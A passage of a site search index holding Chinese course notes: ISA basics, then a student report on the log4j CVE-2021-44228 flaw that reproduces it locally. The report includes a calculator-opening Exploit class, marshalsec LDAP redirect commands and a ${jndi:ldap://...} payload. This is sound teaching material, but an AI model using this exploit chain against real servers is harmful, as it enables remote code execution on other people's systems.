\u5bc4\u5b58\u5668\u53ef\u5b58\u50a8\u7684\u957f\u5ea6\u56fa\u5b9a \u7f16\u8bd1\u5668\u9700\u8981\u66f4\u597d\u7684\u7ba1\u7406\u5bc4\u5b58\u5668 \u5bc4\u5b58\u5668\u4e2a\u6570\u6709\u9650 RISC-V ISA \u00b6 \u89c1 RISC-V ISA","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e00\uff5e\u5341\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u903b\u8f91\u4e0e\u8ba1\u7b97\u673a\u8bbe\u8ba1\u57fa\u7840\uff08\u7b2c\u4e94\u7248\uff09 \u7b2c\u4e5d\u7ae0\u3001\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#isa","text":"","title":"ISA \u6982\u5ff5"},{"location":"cs/system/cs1/topic5/#_2","text":"\u6307\u4ee4\uff08instruction\uff09= \u64cd\u4f5c\u7b26\uff08opcode\uff09+ \u64cd\u4f5c\u6570\uff08operand\uff09 \u6307\u4ee4\u683c\u5f0f\u5305\u542b\u957f\u5ea6\u3001\u64cd\u4f5c\u6570\u4e2a\u6570\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u3001\u5bfb\u5740\u5185\u5b58\u5927\u5c0f\u3001\u5bfb\u5740\u6a21\u5f0f\u7b49","title":"\u6307\u4ee4"},{"location":"cs/system/cs1/topic5/#_3","text":"CPU \u53ef\u4ee5\u201c\u7406\u89e3\u201d\u7684\u4e00\u7cfb\u5217\u6307\u4ee4\uff0c\u4ee5\u4e8c\u8fdb\u5236\u673a\u5668\u7801\uff08machine code\uff09\u7684\u5f62\u5f0f\u8868\u73b0","title":"\u6307\u4ee4\u96c6"},{"location":"cs/system/cs1/topic5/#_4","text":"\u89c4\u5b9a\u4e86\u6240\u6709\u786c\u4ef6\u5b9e\u73b0\u7684\u6307\u4ee4\u3001\u89c4\u5b9a\u4e86\u6307\u4ee4\u7b26\u53f7\u540d\u79f0\u3001\u4e8c\u8fdb\u5236\u7f16\u7801\u683c\u5f0f\uff0c\u63d0\u4f9b\u4e86\u6bcf\u6761\u6307\u4ee4\u7cbe\u786e\u5b9a\u4e49\u7684\u201d\u624b\u518c\u201c\u5373\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784\uff08ISA\uff0cInstruction Set Architecture\uff09 \u8ba1\u7b97\u673a\u6839\u636e ISA \u5b9e\u73b0\uff0cISA \u53ef\u4ee5\u6709\u591a\u79cd\u5b9e\u73b0\u3001ISA \u4f7f\u8f6f\u4ef6\u53ef\u4ee5\u64cd\u7eb5\u786c\u4ef6\u3001ISA \u5b9a\u4e49\u4e86\u673a\u5668\u8bed\u8a00\uff0cISA \u89c4\u5b9a\u4e86\u5fae\u5904\u7406\u5668\uff08microprocessor\uff09\u7684\u8bbe\u8ba1\uff08ISA \u5b9a\u4e49\u4e86 CPU \u6216\u8005\u4e00\u7c7b CPU\uff0c\u5b83\u5305\u542b CPU \u7684\u5185\u5b58\u89c6\u56fe\u3001\u5bc4\u5b58\u5668\u4e2a\u6570\u7b49\u4fe1\u606f\uff0c\u800c\u4e0d\u53ea\u662f\u4e00\u7cfb\u5217\u6307\u4ee4\u7684\u96c6\u5408\uff09 \u6ce8\uff1a\u4f53\u7cfb\u7ed3\u6784\u8986\u76d6\u6574\u4e2a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec ISA\u3001\u7ec4\u6210\u548c\u786c\u4ef6\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f ISA\u3002ISA \u4e5f\u4e0d\u662f CPU \u7684\u4f53\u7cfb\u7ed3\u6784\uff08\u540c\u4e00 ISA \u6709\u4e0d\u540c\u79cd CPU\uff09","title":"\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#isa_1","text":"","title":"ISA \u8bbe\u8ba1"},{"location":"cs/system/cs1/topic5/#_5","text":"","title":"\u8bbe\u8ba1\u539f\u5219"},{"location":"cs/system/cs1/topic5/#_7","text":"","title":"\u64cd\u4f5c\u6570"},{"location":"cs/system/cs1/topic5/#_13","text":"\u5728\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u4f55\u83b7\u53d6\u64cd\u4f5c\u6570\u53d6\u51b3\u4e8e\u6307\u4ee4\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u5bfb\u5740\u6a21\u5f0f\u6307\u5b9a\u4e86\u4e00\u4e2a\u5728\u5b9e\u9645\u8bbf\u95ee\u64cd\u4f5c\u6570\u4e4b\u524d\uff0c\u89e3\u91ca\u6216\u8c03\u6574\u6307\u4ee4\u5730\u5740\u5b57\u6bb5\u7684\u89c4\u5219\uff0c\u7528\u8fd9\u4e2a\u89c4\u5219\u53ef\u4ee5\u751f\u6210\u64cd\u4f5c\u6570\u7684\u6709\u6548\u5730\u5740\uff08effective address\uff09\u3002 \u5bfb\u5740\u6a21\u5f0f\u53ef\u4ee5\u6307\u5b9a\u5230\u5e38\u6570\u3001\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u5730\u5740\u3002\u9ad8\u6548\u7684\u5bfb\u5740\u6a21\u5f0f\u8bbe\u8ba1\u53ef\u4ee5\u51cf\u5c11\u6307\u4ee4\u7684\u957f\u5ea6\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u5bfb\u5740\u6a21\u5f0f","title":"\u5bfb\u5740\u6a21\u5f0f"},{"location":"cs/system/cs1/topic5/#_18","text":"","title":"\u64cd\u4f5c\u7c7b\u578b\u53ca\u7f16\u7801"},{"location":"cs/system/cs1/topic5/#risc-cisc","text":"","title":"RISC \u4e0e CISC"},{"location":"cs/system/cs1/topic5/#_21","text":"\u5bfb\u5740\u7ed3\u6784\u6709\u51e0\u79cd\uff1a \u7d2f\u52a0\u5668\u7ed3\u6784\uff0cAccumulator\uff081960 \u524d\uff0c\u5982 68HC11\uff09 \u6808\u7ed3\u6784\uff0cStack\uff081960s ~ 1970s\uff09 \u5b58\u50a8\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cMemory-Memory\uff081970s ~ 1980s\uff09 \u5bc4\u5b58\u5668\u5230\u5b58\u50a8\u5668\u7ed3\u6784\uff0cRegister-Memory\uff081970s \u81f3\u4eca\uff0c\u5982 x86\uff09 \u5bc4\u5b58\u5668\u5230\u5bc4\u5b58\u5668\u7ed3\u6784\uff0cRegister-Register\uff081960s \u81f3\u4eca\uff0c\u5982 MIPS\uff09\uff0c\u53c8\u79f0\u88c5\u8f7d/\u5b58\u50a8\u7ed3\u6784\uff08Load/Store\uff09","title":"\u5bfb\u5740\u7ed3\u6784"},{"location":"cs/system/cs1/topic5/#risc-v-isa","text":"\u89c1 RISC-V ISA","title":"RISC-V ISA"},{"location":"cs/system/cs1/topic6/","text":"\u5904\u7406\u5668 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e09\uff5e\uff1f\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u5904\u7406\u5668"},{"location":"cs/system/cs1/topic6/#_1","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u5341\u4e09\uff5e\uff1f\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a","title":"\u5904\u7406\u5668"},{"location":"cs/web/","text":"Web \u76f8\u5173 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b web \u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0 Table of Contents \u00b6 SVG log4j \u6f0f\u6d1e\u590d\u73b0","title":"Web \u76f8\u5173"},{"location":"cs/web/#web","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b web \u76f8\u5173\u5185\u5bb9\u7684\u7b14\u8bb0","title":"Web \u76f8\u5173"},{"location":"cs/web/#table-of-contents","text":"SVG log4j \u6f0f\u6d1e\u590d\u73b0","title":"Table of Contents"},{"location":"cs/web/log4j_vuln/","text":"log4j \u6f0f\u6d1e\u590d\u73b0 \u00b6 Abstract \u8fd9\u7bc7\u662f\u6d59\u6c5f\u5927\u5b66 \u201c\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5bfc\u8bba\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u7684\u8bfe\u7a0b\u62a5\u544a \u4ecb\u7ecd\u4e86 log4j \u53ca\u7531\u5176\u5f15\u53d1\u7684 CVE-2021-44228 \u6f0f\u6d1e\uff0c\u5e76\u4ece JNDI\u3001LDAP\u3001RMI\u3001log4j \u7b49\u65b9\u9762\u5206\u6790\u4e86\u8be5\u6f0f\u6d1e\u7684\u5177\u4f53\u539f\u7406\uff0c\u518d\u901a\u8fc7 LDAP\u3001RMI \u4e24\u79cd\u65b9\u5f0f\u672c\u5730\u590d\u73b0\u8be5\u6f0f\u6d1e\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u548c\u53cd\u5f39\u7ec8\u7aef\uff0c\u6700\u540e\u4ecb\u7ecd\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u3002 log4j \u6f0f\u6d1e\u6982\u8ff0 \u00b6 log4j \u7b80\u4ecb \u00b6 log4j \u662f Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u6e90 Java \u65e5\u5fd7\u6846\u67b6\u3002\u5b83\u63d0\u4f9b\u4e86\u4e30\u5bcc\u53ef\u6269\u5c55\u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0e\u8f93\u51fa\u529f\u80fd\uff0c\u53ef\u4ee5\u8f93\u51fa\u65e5\u5fd7\u5230\u4efb\u610f\u4f4d\u7f6e\u3001\u66f4\u6539\u65e5\u5fd7\u5185\u5bb9\u6837\u5f0f\u3001\u6307\u5b9a\u65e5\u5fd7\u7ea7\u522b\u5e76\u5206\u7ea7\u522b\u663e\u793a\u3001\u4ee5\u53ca\u5229\u7528 ${} \u8bed\u53e5\u8f93\u51fa\u52a8\u6001\u5185\u5bb9\u7b49\u3002 \u968f\u7740\u6280\u672f\u53d1\u5c55\uff0c1.x \u7248\u672c\u7684 log4j \u9010\u6e10\u5728\u7ed3\u6784\u3001\u6027\u80fd\u4e0a\u88ab slf4j\u3001logback \u7b49\u65b0\u5174\u7684\u65e5\u5fd7\u6846\u67b6\u8d85\u8d8a\uff0cApache \u4e5f\u56e0\u6b64\u5bf9 log4j \u8fdb\u884c\u4e86\u4e00\u6b21\u91cd\u6784\u5347\u7ea7\uff0c\u53d1\u5e03\u4e86\u4f18\u5316\u4e86\u7ed3\u6784\u3001\u6027\u80fd\u7684 2.x \u7248\u672c log4j\uff08\u53c8\u540d log4j2\uff09\u3002log4j2 \u501f\u9274\u4e86 slf4j \u7684\u7ed3\u6784\u8bbe\u8ba1\uff0c\u5206\u4e3a\u4e86\u4e24\u90e8\u5206\uff1alog4j-api\u3001log4j-core\uff0c\u524d\u8005\u4ec5\u63d0\u4f9b\u63a5\u53e3\uff0c\u540e\u8005\u63d0\u4f9b\u5b9e\u73b0\u3002\u5305\u540d\u5206\u522b\u4e3a org.apache.logging.log4j \u548c org.apache.logging.log4j.core\u3002 \u56e0\u4e3a log4j \u7684\u6613\u7528\u6027\uff0c\u4f17\u591a\u4ee5 Java \u4f5c\u4e3a\u540e\u7aef\u670d\u52a1\u8bed\u8a00\u7684\u7f51\u7edc\u5e94\u7528\u3001\u8f6f\u4ef6\u90fd\u5728\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u3002 CVE-2021-44228 \u00b6 CVE-2021-44228 \u662f\u963f\u91cc\u4e91\u56e2\u961f\u5728 2021 \u5e74 11 \u6708 26 \u65e5\u63d0\u4ea4\u3001\u540c\u5e74 12 \u6708 9 \u65e5\u516c\u5f00\u7684\u5173\u4e8e log4j \u7684\u91cd\u5927\u6f0f\u6d1e\u3002\u5b83\u53ef\u4ee5\u5b9e\u73b0 RCE\uff08Remote Code Execution\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff09\uff0c\u4ece\u800c\u5371\u5bb3\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684 Java \u670d\u52a1\u5668\u7684\u5b89\u5168\u3002CVSS3.0\uff08\u901a\u7528\u6f0f\u6d1e\u8bc4\u5206\u7cfb\u7edf\uff09\u8bc4\u5206 10.0 \u5206\u3001\u8bc4\u7ea7 critical\u3002 \u8be5\u6f0f\u6d1e\u5a01\u80c1\u7b49\u7ea7\u9ad8\u3001\u5f71\u54cd\u9762\u5e7f\u6cdb\u3001\u5229\u7528\u4ef7\u503c\u9ad8\u3001\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u53d7\u5230\u5e7f\u6cdb\u5173\u6ce8\u3002\u5e76\u4e14\u56e0\u4e3a log4j \u7684\u5e7f\u6cdb\u5e94\u7528\uff0c\u5305\u62ec\u82f9\u679c\u3001\u8c37\u6b4c\u3001\u767e\u5ea6\u3001Steam \u7b49\u5728\u5185\u7684\u5927\u578b\u4e92\u8054\u7f51\u4f01\u4e1a\u7684\u4ea7\u54c1\u4e5f\u90fd\u53d7\u5230\u8be5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002 \u8be5\u6f0f\u6d1e\u7531 JNDI \u7279\u6027\u5f15\u8d77\uff0c\u5176\u5e76\u6ca1\u6709\u4fdd\u62a4\u901a\u8fc7 LDAP \u7b49\u67e5\u627e JNDI \u7684\u65b9\u5f0f\uff0c\u9020\u6210\u6f5c\u5728\u7684 RCE\u3002\u5f71\u54cd\u8303\u56f4\u4ece log4j \u7248\u672c 2.0-beta9 \u5f00\u59cb\u5230 2.15.0-rc1\uff0c\u5e76\u5728 2.15.0-rc2 \u7248\u672c\u4e2d\u5c06\u8fd9\u4e00\u884c\u4e3a\u9ed8\u8ba4\u5173\u95ed\uff0c\u5728 2.16.0 \u7248\u672c\u4e2d\u5b8c\u5168\u79fb\u9664\u3002 log4j \u6f0f\u6d1e\u539f\u7406 \u00b6 JNDI \u7b80\u4ecb \u00b6 JNDI\uff08Java Naming and Directory Interface\uff0cJava \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\uff09\u662f\u7528\u4e8e\u4ece Java \u5e94\u7528\u4e2d\u8bbf\u95ee\u540d\u79f0\u548c\u76ee\u5f55\u670d\u52a1\u7684\u4e00\u7ec4 API\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u5c06\u540d\u79f0/\u76ee\u5f55\u4e0e\u5bf9\u8c61\u76f8\u5173\u8054\uff0c\u5e76\u63d0\u4f9b\u4e86\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u6765\u67e5\u627e\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 JNDI \u67b6\u6784\u5206\u4e3a\u4e09\u5c42\uff1a JNDI API\uff1a\u4e0e Java \u5e94\u7528\u7a0b\u5e8f\u901a\u4fe1\uff0c\u63d0\u4f9b\u7f16\u7a0b\u63a5\u53e3\uff0c\u9694\u79bb\u5e94\u7528\u4e0e\u6570\u636e\u6e90 Naming Manager\uff1a\u547d\u540d\u670d\u52a1\u7ba1\u7406\u5668 JNDI SPI\uff1a\u4e0e\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\uff08\u670d\u52a1\uff09\u76f8\u8fde\u63a5 JNDI \u652f\u6301\u7684\u670d\u52a1\u6709\u5f88\u591a\uff0c\u6bd4\u5982 RMI\u3001LDAP\u3001DNS \u7b49\u670d\u52a1\u3002JNDI \u5c01\u88c5\u4e86\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f7f\u5f97\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u4ee3\u7801\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\uff08\u8c03\u7528\u5bb9\u5668\u73af\u5883\u7684 Context \u7684 lookup \u65b9\u6cd5\uff09 RMI \u7b80\u4ecb \u00b6 RMI\uff08Remote Method Invocation\uff0c\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff09\u670d\u52a1\u63d0\u4f9b\u4e86\u4ece\u4e00\u4e2a JVM \u4e2d\u5bf9\u8c61\u8c03\u7528\u53e6\u4e00\u4e2a JVM \u5bf9\u8c61\u65b9\u6cd5\u7684\u65b9\u5f0f\u3002\u4e5f\u662f RPC\uff08Remote Procedure Calls\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u9762\u5411\u5bf9\u8c61\u7b49\u4ef7\u670d\u52a1\u3002\u5b83\u9700\u8981\u4e00\u4e2a Server \u7aef\u63d0\u4f9b RMI \u670d\u52a1\u548c\u4e00\u4e2a Client \u7aef\u8bbf\u95ee\u8fdc\u7a0b\u63d0\u4f9b\u7684 RMI \u670d\u52a1\u3002RMI \u670d\u52a1\u5206\u4e3a\u4e09\u5c42\uff1a \u5b58\u6839\u4e0e\u9aa8\u67b6 \u5b58\u6839\uff08Stub\uff09\uff1a\u4e0e Client \u7aef\u76f8\u8fde\uff0c\u662f\u8fdc\u7a0b\u5bf9\u8c61\u7684\u4ee3\u7406 \u9aa8\u67b6\uff08Skeleton\uff09\uff1a\u4e0e Server \u7aef\u76f8\u8fde\uff0c\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5 \u8fdc\u7a0b\u5f15\u7528\u5c42\uff08Remote Reference Layer\uff09\uff1a\u7528\u6765\u5bfb\u627e\u901a\u4fe1\u5bf9\u8c61\u4ee5\u53ca\u901a\u8fc7 RMI Registry \u63d0\u4f9b\u547d\u540d\u670d\u52a1 \u4f20\u8f93\u5c42\uff08Transport Layer\uff09\uff1a\u5728 Server \u4e0e Client \u7aef\u5efa\u7acb socket \u901a\u4fe1 Server \u7aef\u5f00\u542f RMI \u670d\u52a1\u65f6\u5148\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5411 registry \u6ce8\u518c\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7b49\u5f85\u8c03\u7528\u3002Client \u7aef\u8fdb\u884c RMI \u65f6\u8bbf\u95ee registry \u5f97\u5230\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5b58\u6839\uff0c\u518d\u901a\u8fc7\u5b58\u6839\u8fdc\u7a0b\u8c03\u7528\u65b9\u6cd5\uff0c\u5b58\u6839\u5e8f\u5217\u5316\u8c03\u7528\u540e\u4e0e\u9aa8\u67b6\u901a\u4fe1\u4f7f\u9aa8\u67b6\u4ee3\u7406\u8c03\u7528\u65b9\u6cd5\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u7ed9\u5b58\u6839\u518d\u53cd\u5e8f\u5217\u5316\u4ea4\u7ed9\u5ba2\u6237\u7aef\u3002 LDAP \u7b80\u4ecb \u00b6 LDAP\uff08Lightweight Directory Access Protocol\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u3001\u4e2d\u7acb\u7684\u3001\u5de5\u4e1a\u6807\u51c6\u7684\u5e94\u7528\u534f\u8bae\uff0c\u901a\u8fc7 TCP/IP \u534f\u8bae\u63d0\u4f9b\u8bbf\u95ee\u63a7\u5236\u548c\u7ef4\u62a4\u5206\u5e03\u5f0f\u4fe1\u606f\u7684\u76ee\u5f55\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 LDAP \u534f\u8bae\u6765\u8bbf\u95ee\u7f51\u7edc\u8d44\u6e90\uff0c\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u6811\u5f62\u7684\u6570\u636e\u5e93\u3002 JNDI \u6ce8\u5165\u539f\u7406 \u00b6 \u5982\u524d\u9762\u6240\u8bf4\uff0cJNDI \u5c01\u88c5\u4e86\u4e00\u4e9b\u670d\u52a1\uff0c\u5e76\u4e14\u901a\u8fc7 lookup \u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u8fc7 lookup(\"rmi://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee ip:port \u63d0\u4f9b\u7684 RMI \u670d\u52a1\uff0c\u901a\u8fc7 lookup(\"ldap://ip:port/...\") \u7684\u5f62\u5f0f\u8bbf\u95ee LDAP \u670d\u52a1\u3002 JNDI \u7684\u76ee\u7684\u662f\u901a\u8fc7\u540d\u79f0/\u76ee\u5f55\u83b7\u53d6\u5bf9\u8c61\uff0c\u800c\u8fdc\u7a0b\u8bfb\u53d6\u7684\u4e00\u822c\u662f\u7f16\u8bd1\u540e\u7684 .class \u6587\u4ef6\u6240\u4ee5\u5728 lookup \u65f6\u4f1a\u8fdb\u884c\u7c7b\u52a0\u8f7d\uff0cJVM \u5c06\u5176\u52a0\u8f7d\u4e3a Java \u7c7b\u3002\u800c\u5f53 ClassLoader \u52a0\u8f7d .class \u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u7c7b\u7684 clinit \u65b9\u6cd5\uff0c\u6267\u884c\u7c7b\u7684\u9759\u6001\u4ee3\u7801\u3002\u56e0\u6b64\u5982\u679c\u53ef\u4ee5\u63a7\u5236 JNDI lookup \u7684 URL\uff0c\u4fbf\u53ef\u4ee5\u4efb\u610f\u52a0\u8f7d\u8fdc\u7a0b\u7c7b\uff0c\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u4e5f\u5c31\u662f JNDI \u6ce8\u5165\u539f\u7406\u3002 \u4f46\u662f JNDI \u6ce8\u5165\u53d7\u5230 JDK \u914d\u7f6e\u9650\u5236\uff0c\u5982\u679c com.sun.jndi.xxx.object.trustURLCodebase \u8fd9\u4e00\u914d\u7f6e\u662f false \u65f6\u5219\u4e0d\u4f1a\u4fe1\u4efb URL \u4ece\u800c\u65e0\u6cd5\u8fdb\u884c JNDI \u6ce8\u5165\u3002\u5728 JDK 11.0.1\u30018u191\u30017u201\u30016u211 \u7b49\u7248\u672c\u4e2d\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u662f true\uff0c\u800c\u4ece 6u132\u30017u122\u30018u113 \u5f00\u59cb\uff0c\u8fd9\u4e00\u914d\u7f6e\u9ed8\u8ba4\u4e3a false\uff08\u56e0\u6b64\u540e\u9762\u4f7f\u7528\u9ad8\u7248\u672c JDK \u590d\u73b0\u65f6\u8981\u624b\u52a8\u5f00\u542f\u8fd9\u4e00\u914d\u7f6e\uff09 CVE-2021-44228 \u6f0f\u6d1e\u539f\u7406 \u00b6 CVE-2021-44228 \u5373\u662f\u901a\u8fc7 log4j \u6765\u5b9e\u73b0\u4e86 JNDI \u6ce8\u5165\u3002log4j \u53ef\u4ee5\u901a\u8fc7 ${} \u8bed\u6cd5\u6765\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5e76\u8f93\u51fa\u5230\u65e5\u5fd7\u4e2d\uff0c\u5176\u4e2d\u5bf9\u4e8e\u6bcf\u4e2a ${} \u90e8\u5206\u4f7f\u7528 lookup \u65b9\u6cd5\u6765\u89e3\u51b3\u53d8\u91cf\uff0c\u5176\u4e2d\u4e5f\u63d0\u4f9b\u4e86 JndiLookup\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u4f7f\u7528 JNDI \u6765\u8bfb\u53d6\u5185\u5bb9\uff0c\u5f62\u5982 ${jndi:...}\u3002\u8fd9\u65f6\u5c31\u5b58\u5728 JNDI \u6ce8\u5165\u3002 \u800c\u5927\u90e8\u5206\u4f7f\u7528 log4j \u6765\u8bb0\u5f55\u65e5\u5fd7\u7684\u7f51\u7edc\u5e94\u7528\u90fd\u4f1a\u8bb0\u5f55\u7528\u6237\u7684\u8f93\u5165\uff0c\u6bd4\u5982\u641c\u7d22\u7f51\u7ad9\u4f1a\u8bb0\u5f55\u7528\u6237\u641c\u7d22\u7684\u5185\u5bb9\uff0c\u8fd9\u65f6\u5982\u679c\u7528\u6237\u8f93\u5165\u7684\u662f ${jndi:...}\uff08\u6bd4\u5982 ${jndi:ldap://ip:port/...}\uff09 \u5c31\u4f1a\u8fdb\u884c JndiLookup\uff0c\u5b9e\u73b0 JNDI \u6ce8\u5165\uff0c\u8fd9\u4e5f\u5c31\u662f CVE-2021-44228 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u7406\u3002 log4j \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4e0b\u9762\u5206\u522b\u901a\u8fc7\u8c03\u7528 LDAP \u548c RMI \u670d\u52a1\u7684\u65b9\u5f0f\u6765\u590d\u73b0\u8fd9\u4e00 JNDI \u6ce8\u5165\u6f0f\u6d1e\u3002 LDAP \u5b9e\u73b0 \u00b6 \u8fdb\u884c\u8fd9\u4e00\u6f0f\u6d1e\u7684\u590d\u73b0\u9700\u8981\u4ee5\u4e0b\u4e24\u4e2a\u90e8\u5206\uff1a \u4e00\u4e2a LDAP \u670d\u52a1\uff0c\u7528\u6765\u91cd\u5b9a\u5411\u63d0\u4f9b\u653b\u51fb\u7c7b \u9700\u8981\u4e00\u4e2a\u7f51\u7edc\u670d\u52a1\u6765\u4e3a\u5176\u63d0\u4f9b\u653b\u51fb\u7c7b \u4e00\u4e2a\u5305\u542b\u5b58\u5728\u6f0f\u6d1e\u7684 log4j \u7ec4\u4ef6\u7684 Java \u5e94\u7528 \u653b\u51fb\u7c7b \u00b6 \u9996\u5148\u662f\u7528\u4e8e\u53d1\u8d77\u653b\u51fb\u7684 Exploit \u7c7b\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a public class Exploit { static { try { String [] cmds = { \"open\" , \"/System/Applications/Calculator.app\" }; java . lang . Runtime . getRuntime (). exec ( cmds ). waitFor (); } catch ( Exception e ) { e . printStackTrace (); } } } \u4f7f\u7528 javac Exploit.java \u5c06\u8fd9\u4e2a\u7c7b\u7f16\u8bd1\u4e3a .class \u7c7b\u6587\u4ef6\uff0c\u7136\u540e\u4f7f\u7528 python -m http.server 8888 \u4e3a\u5f53\u524d\u76ee\u5f55\u5728 8888 \u7aef\u53e3\u5f00\u542f\u4e00\u4e2a HTTP \u670d\u52a1\u3002\u53ef\u4ee5\u901a\u8fc7 curl -I 127.0.0.1:8888/Exploit.class \u6765\u68c0\u67e5\u662f\u5426\u6b63\u5e38\u90e8\u7f72\uff0c\u80fd\u5426\u83b7\u53d6\u5230\u5f53\u524d Exploit \u7c7b\u6587\u4ef6\u3002 LDAP \u670d\u52a1 \u00b6 \u4f7f\u7528 marshalsec \u63d0\u4f9b\u7684\u5de5\u5177\u6765\u76f4\u63a5\u642d\u5efa LDAP \u670d\u52a1 git clone https://github.com/mbechler/marshalsec.git cd marshalsec mvn clean package -DskipTests # \u901a\u8fc7 maven \u6784\u5efa java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\ marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8888/#Exploit\" \u8fd9\u4e2a LDAP \u670d\u52a1\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bf9 8888 \u7aef\u53e3\u4e2d\u7684 Exploit \u7c7b\u6587\u4ef6\u7684\u91cd\u5b9a\u5411\u8bbf\u95ee\uff0c\u7aef\u53e3\u5728\u9ed8\u8ba4\u7684 1389\u3002 log4j \u6f0f\u6d1e\u5e94\u7528 \u00b6 \u7f16\u5199\u4e00\u4e2a\u53ea\u8c03\u7528\u4e86 log4j \u8bb0\u5f55 ${jndi:ldap://127.0.0.1:1389/Exploit} \u7684\u7c7b\uff08\u8fd9\u4e2a payload \u4e00\u822c\u662f\u7531\u7528\u6237\u8f93\u5165\u83b7\u53d6\u7684\uff0c\u4f46\u8fd9\u91cc\u65b9\u4fbf\u590d\u73b0\u76f4\u63a5\u786c\u7f16\u7801\u5230\u6f0f\u6d1e\u5e94\u7528\u4e2d\u4e86\uff0c\u4e8c\u8005\u672c\u8d28\u662f\u4e00\u6837\u7684\uff09\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; public class log4j { private static final Logger logger = LogManager . getLogger ( log4j . class ); public static void main ( String [] args ) { System . setProperty ( \"com.sun.jndi.ldap.object.trustURLCodebase\" , \"true\" ); logger . error ( \"${jndi:ldap://127.0.0.1:1389/Exploit}\" ); } } \u6ce8\u610f\u56e0\u4e3a\u662f\u9ad8\u7248\u672c JDK\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5f00\u542f com.sun.jndi.ldap.object.trustURLCodebase \u9009\u9879\u3002 \u590d\u73b0\u653b\u51fb \u00b6 \u524d\u9762\u5df2\u7ecf\u6b63\u5e38\u5f00\u542f\u4e86 LDAP \u670d\u52a1\uff0c\u6240\u4ee5\u6f0f\u6d1e\u5e94\u7528\u8fd0\u884c\u65f6\u53ef\u4ee5\u76f4\u63a5\u52a0\u8f7d\u5230 Exploit \u7c7b\uff0c\u6267\u884c\u5176\u4e2d\u9759\u6001\u4ee3\u7801\u3002\u56e0\u4e3a\u5176\u4e2d\u901a\u8fc7 exec \u6267\u884c\u4e86 open /System/Applications/Calculator.app \u547d\u4ee4\uff0c\u6240\u4ee5\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\u5e94\u7528\u3002 \u53ef\u4ee5\u770b\u5230 LDAP 